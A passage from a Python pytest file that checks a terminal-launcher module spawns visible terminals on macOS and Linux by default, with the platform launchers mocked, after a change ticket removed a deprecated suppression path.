def test_os_window_disabled_by_falsey_flag(monkeypatch, value):
    monkeypatch.setenv(tl._OS_WINDOW_FLAG, value)
    assert tl._os_window_enabled() is False


def test_visible_launch_spawns_by_default_no_flag(tmp_path, monkeypatch):
    # CH-01KTK7 reversal: with NO SULIS_TERMINAL_OS_WINDOW set, a visible launch
    # OPENS the terminal by default — it dispatches to the platform launcher and
    # returns "spawned". No "open it in the cockpit" _failed pointer.
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.delenv(tl._OS_WINDOW_FLAG, raising=False)
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)) as m:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=True)
    assert result["status"] == "spawned"
    assert m.call_count == 1


def test_visible_launch_no_cockpit_pointer_when_flag_off(tmp_path, monkeypatch):
    # The deprecated suppression path is gone: a visible launch with the flag
    # off MUST NOT return a _failed dict pointing at the cockpit. (Regression
    # guard for the exact behaviour CH-01KTK7 removes.)
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.delenv(tl._OS_WINDOW_FLAG, raising=False)
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=True)
    assert result["status"] != "failed"
    err = (result.get("error") or "")
    assert "cockpit" not in err.lower()
    assert "deprecated" not in err.lower()


def test_visible_launch_still_dispatches_when_flag_on(tmp_path, monkeypatch):
    # The override flag remains harmless: with it on, a visible launch still
    # dispatches to the platform launcher (same default-on behaviour).
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv(tl._OS_WINDOW_FLAG, "1")
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)) as m:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=True)
    assert m.call_count == 1
    assert result["status"] == "spawned"


def test_visible_launch_linux_spawns_by_default_no_flag(tmp_path, monkeypatch):
    # The default-on reversal applies on Linux too — no flag needed to reach the
    # gnome-terminal/konsole/xterm dispatch.
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.delenv(tl._OS_WINDOW_FLAG, raising=False)
    with mock.patch.object(tl.platform, "system", return_value="Linux"), \
            mock.patch.object(tl, "_launch_linux",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)) as m:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=True)
    assert m.call_count == 1
    assert result["status"] == "spawned"


def test_headless_launch_spawns_regardless_of_flag(tmp_path, monkeypatch):
    # The headless (visible=False) path is unaffected — it spawns regardless of
    # the flag (used by automation), exactly as before.
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.delenv(tl._OS_WINDOW_FLAG, raising=False)
    with mock.patch.object(tl.platform, "system", return_value="Linux"), \
            mock.patch.object(tl, "_launch_headless",
                              side_effect=lambda sp, cid: _spawned_dict(sp)) as m:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=False)
    assert m.call_count == 1
    assert result["status"] == "spawned"


def test_module_un_deprecated_for_change_start():
    # CH-01KTK7: the direct terminal is the sanctioned change-start launcher
    # again — the module must NOT frame the change-start spawn path as a
    # deprecated fallback. (The in-cockpit <LiveTerminal/> is a separate
    # browser-rendering capability and may still be mentioned as such.)
    src = Path(tl.__file__).read_text()
    assert "DEPRECATED(strangle)" not in src
    # The launcher's purpose statement should describe the sanctioned spawn,
    # not a deprecated-in-favour-of-cockpit posture.
    assert "launch_change_terminal" in src
